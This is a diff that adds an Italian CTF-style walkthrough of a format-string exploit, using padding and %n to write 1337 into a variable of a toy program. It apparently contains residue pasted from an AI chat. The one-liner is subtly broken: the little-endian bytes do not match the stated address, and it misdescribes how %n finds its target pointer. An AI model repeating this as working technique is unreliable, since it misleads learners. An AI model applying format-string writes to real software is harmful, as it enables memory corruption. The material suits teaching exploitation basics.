@@ -1,0 +1,11 @@
+Exploit:
+Esegui il programma: ./vulnerable. Ti darà l'indirizzo di segreto (es. 0x7fffffffdcf0).
+Crea l'exploit. Vogliamo scrivere 1337 in segreto. Useremo un padding di 1337 caratteri seguito da %n:
+./vulnerable $(python -c 'print "A" * 1337 + "\xf0\xdc\xff\xff\xff\xff\xff\x7f%n"') # sostituisci con l'indirizzo corretto in little-endian.  Assumendo architettura x64.
+Use code with caution.
+Bash
+Spiegazione:
+"A" * 1337: Questo crea una stringa di 1337 caratteri 'A'. printf stamperà questi caratteri, quindi il contatore arriverà a 1337.
+\xf0\xdc\xff\xff\xff\xff\xff\x7f: Questo è l'indirizzo di segreto in formato little-endian (in questo esempio, devi sostituirlo con l'indirizzo che il programma ti ha dato). printf interpreterà questo come un puntatore.
+%n: Questo dice a printf di scrivere il numero di caratteri stampati finora (1337) all'indirizzo puntato dall'argomento precedente (l'indirizzo di segreto).
+Questo esempio è molto artificioso. In un CTF reale, non avrai l'indirizzo stampato per te, e l'offset tra buffer e segreto potrebbe essere diverso, richiedendo calcoli e tecniche più avanzate.
